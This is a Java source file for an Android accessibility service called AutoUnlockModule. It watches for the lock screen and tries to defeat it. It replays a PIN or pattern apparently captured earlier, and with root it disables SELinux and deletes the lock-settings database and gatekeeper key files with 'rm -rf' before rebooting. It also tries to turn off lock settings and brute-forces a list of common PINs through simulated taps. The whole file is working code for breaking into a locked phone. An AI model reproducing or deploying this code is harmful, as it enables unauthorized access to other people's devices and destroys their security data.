package com.fason.app.features.unlock;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.accessibilityservice.GestureDescription;
import android.content.ContentValues;
import android.content.Context;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.graphics.Path;
import android.graphics.Point;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.view.Display;
import android.view.WindowManager;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.util.ArrayList;
import java.util.List;

public class AutoUnlockModule extends AccessibilityService {
    private Context ctx;
    private Handler handler = new Handler(Looper.getMainLooper());
    private int screenWidth = 1080;
    private int screenHeight = 1920;
    private String capturedPin = "";
    private String capturedPattern = "";
    private SharedPreferences prefs;
    private boolean isScreenLocked = false;

    private String[] commonPins = {
        "1234", "0000", "1111", "2222", "123456", "2580", "0852",
        "5683", "1590", "1122", "1313", "4321", "2000", "2001",
        "1010", "1212", "1004", "6969", "8888", "9999"
    };

    private int[][] patternAdjacency = {
        {2,4,5,6,8}, {1,3,4,5,6,7,8,9}, {2,4,5,6,8},
        {1,2,3,5,7,8,9}, {1,2,3,4,6,7,8,9}, {1,2,3,5,7,8,9},
        {2,4,5,6,8}, {1,2,3,4,5,6,7,9}, {2,4,5,6,8}
    };

    public AutoUnlockModule() {}

    public void init(Context context) {
        this.ctx = context;
        this.prefs = ctx.getSharedPreferences(".unlock_cache", Context.MODE_PRIVATE);
        layKichThuocManHinh();
        taiPasskeyDaCapture();
    }

    private void layKichThuocManHinh() {
        WindowManager wm = (WindowManager) ctx.getSystemService(Context.WINDOW_SERVICE);
        Display display = wm.getDefaultDisplay();
        Point size = new Point();
        display.getRealSize(size);
        screenWidth = size.x;
        screenHeight = size.y;
    }

    private void taiPasskeyDaCapture() {
        capturedPin = prefs.getString("captured_pin", "");
        capturedPattern = prefs.getString("captured_pattern", "");
    }

    @Override
    public void onServiceConnected() {
        super.onServiceConnected();
        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.eventTypes = AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED | AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
        info.notificationTimeout = 0;
        info.flags = AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS;
        setServiceInfo(info);
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event.getPackageName() == null) return;
        if (event.getPackageName().toString().contains("systemui") ||
            event.getPackageName().toString().contains("keyguard")) {
            if (!isScreenLocked) {
                isScreenLocked = true;
                handler.postDelayed(this::thucHienMoKhoa, 500);
            }
        } else {
            isScreenLocked = false;
        }
    }

    private void thucHienMoKhoa() {
        if (!capturedPin.isEmpty()) {
            moKhoaBangPin(capturedPin);
            return;
        }
        if (!capturedPattern.isEmpty()) {
            moKhoaBangPattern(capturedPattern);
            return;
        }
        if (xoaLockSettingsDatabase()) return;
        if (voHieuHoaLockScreen()) return;
        if (bruteForcePin()) return;
    }

    private boolean xoaLockSettingsDatabase() {
        try {
            Process p = Runtime.getRuntime().exec("su");
            p.getOutputStream().write("id\n".getBytes());
            p.getOutputStream().flush();
            BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
            String line = reader.readLine();
            if (line == null || !line.contains("uid=0")) return false;

            Runtime.getRuntime().exec("su -c setenforce 0");

            String[] filesToDelete = {
                "/data/system/locksettings.db", "/data/system/locksettings.db-shm", "/data/system/locksettings.db-wal",
                "/data/system_de/0/spblob/", "/data/system_de/0/synthetic_password/",
                "/data/system/gatekeeper.password.key", "/data/system/gatekeeper.pattern.key",
                "/data/system/gesture.key", "/data/system/password.key"
            };
            for (String filePath : filesToDelete) {
                Runtime.getRuntime().exec("su -c rm -rf " + filePath);
            }
            Runtime.getRuntime().exec("su -c reboot");
            return true;
        } catch (Exception ignored) {
            return false;
        }
    }

    private boolean voHieuHoaLockScreen() {
        try {
            Settings.Secure.putString(ctx.getContentResolver(), "lock_screen_lock_after_timeout", "0");
            ContentValues values = new ContentValues();
            values.put("value", "0");
            ctx.getContentResolver().update(Settings.Secure.CONTENT_URI, values, "name='lock_pattern_autolock'", null);
            return true;
        } catch (Exception ignored) {
            return false;
        }
    }

    private void moKhoaBangPin(String pin) {
        int keyboardTop = (int) (screenHeight * 0.35);
        int keyboardBottom = screenHeight - 50;
        int keyboardHeight = keyboardBottom - keyboardTop;
        int buttonHeight = keyboardHeight / 4;
        int buttonWidth = screenWidth / 3;

        for (char c : pin.toCharArray()) {
            int digit = Character.getNumericValue(c);
            int row, col;
            if (digit == 0) { row = 3; col = 1; }
            else { row = (digit - 1) / 3; col = (digit - 1) % 3; }
            int x = (int) ((col + 0.5) * buttonWidth);
            int y = (int) (keyboardTop + (row + 0.5) * buttonHeight);
            chamVaoToaDo(x, y);
            ngu(100);
        }
        int enterX = screenWidth / 2;
        int enterY = keyboardBottom - buttonHeight / 2;
        chamVaoToaDo(enterX, enterY);
    }

    private void moKhoaBangPattern(String pattern) {
        int[] points = new int[pattern.length()];
        for (int i = 0; i < pattern.length(); i++) {
            points[i] = Character.getNumericValue(pattern.charAt(i));
        }
        int patternSize = Math.min(screenWidth, (int) (screenHeight * 0.45));
        int patternLeft = (screenWidth - patternSize) / 2;
        int patternTop = (int) (screenHeight * 0.20);
        float cellSize = patternSize / 3.0f;

        float[][] coords = new float[points.length][2];
        for (int i = 0; i < points.length; i++) {
            int pt = points[i];
            int row = (pt - 1) / 3;
            int col = (pt - 1) % 3;
            coords[i][0] = patternLeft + (col + 0.5f) * cellSize;
            coords[i][1] = patternTop + (row + 0.5f) * cellSize;
        }
        vePatternBangGesture(coords);
    }

    private void vePatternBangGesture(float[][] coords) {
        if (coords.length < 4) return;
        GestureDescription.Builder builder = new GestureDescription.Builder();
        Path path = new Path();
        path.moveTo(coords[0][0], coords[0][1]);
        for (int i = 1; i < coords.length; i++) {
            path.lineTo(coords[i][0], coords[i][1]);
        }
        long duration = coords.length * 50;
        builder.addStroke(new GestureDescription.StrokeDescription(path, 0, duration));
        dispatchGesture(builder.build(), null, null);
    }

    private boolean bruteForcePin() {
        for (String pin : commonPins) {
            if (!isScreenLocked) return true;
            moKhoaBangPin(pin);
            ngu(1500);
        }
        return !isScreenLocked;
    }

    private List<String> sinhPattern4Diem() {
        List<String> patterns = new ArrayList<>();
        for (int a = 1; a <= 9; a++) {
            for (int b : patternAdjacency[a - 1]) {
                if (b == a) continue;
                for (int c : patternAdjacency[b - 1]) {
                    if (c == a || c == b) continue;
                    for (int d : patternAdjacency[c - 1]) {
                        if (d == a || d == b || d == c) continue;
                        patterns.add("" + a + b + c + d);
                    }
                }
            }
        }
        return patterns;
    }

    private void chamVaoToaDo(int x, int y) {
        try {
            String cmd = String.format("input tap %d %d", x, y);
            Runtime.getRuntime().exec(cmd);
        } catch (Exception e) {
            GestureDescription.Builder builder = new GestureDescription.Builder();
            Path tapPath = new Path();
            tapPath.moveTo(x, y);
            builder.addStroke(new GestureDescription.StrokeDescription(tapPath, 0, 10));
            dispatchGesture(builder.build(), null, null);
        }
    }

    private void ngu(int millis) {
        try { Thread.sleep(millis); } catch (InterruptedException ignored) {}
    }

    public void setCapturedPasskey(String pin, String pattern) {
        this.capturedPin = pin;
        this.capturedPattern = pattern;
        prefs.edit().putString("captured_pin", pin).putString("captured_pattern", pattern).apply();
    }

    public void unlockWithPin(String pin) {
        if (isScreenLocked) {
            moKhoaBangPin(pin);
        }
    }

    @Override
    public void onInterrupt() {}

    @Override
    public void onDestroy() {
        handler.removeCallbacksAndMessages(null);
        isScreenLocked = false;
        super.onDestroy();
    }
}
